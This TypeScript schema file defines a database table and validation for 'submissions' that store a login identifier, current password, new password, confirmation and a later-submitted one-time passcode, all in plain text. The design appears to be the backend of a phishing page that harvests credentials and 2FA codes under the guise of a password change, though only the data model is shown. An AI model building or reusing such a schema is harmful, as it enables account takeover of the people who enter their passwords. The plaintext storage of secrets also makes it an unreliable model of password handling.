import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, serial } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const submissions = pgTable("submissions", {
  id: serial("id").primaryKey(),
  loginMethod: varchar("login_method", { length: 20 }).notNull(),
  identifier: text("identifier").notNull(),
  currentPassword: text("current_password").notNull(),
  newPassword: text("new_password").notNull(),
  confirmPassword: text("confirm_password").notNull(),
  otp: text("otp"),
  submittedAt: timestamp("submitted_at").defaultNow().notNull(),
});

export const insertSubmissionSchema = createInsertSchema(submissions).omit({
  id: true,
  submittedAt: true,
});

export const credentialSubmitSchema = z.object({
  loginMethod: z.enum(["phone", "email", "username"]),
  identifier: z.string(),
  currentPassword: z.string().min(1, "Current password is required"),
  newPassword: z.string().min(8, "New password must be at least 8 characters"),
  confirmPassword: z.string().min(1, "Please confirm your password"),
}).refine((data) => data.newPassword === data.confirmPassword, {
  message: "Passwords don't match",
  path: ["confirmPassword"],
});

export const otpSubmitSchema = z.object({
  submissionId: z.number(),
  otp: z.string(),
});

export type Submission = typeof submissions.$inferSelect;
export type InsertSubmission = z.infer<typeof insertSubmissionSchema>;
export type CredentialSubmit = z.infer<typeof credentialSubmitSchema>;
export type OtpSubmit = z.infer<typeof otpSubmitSchema>;
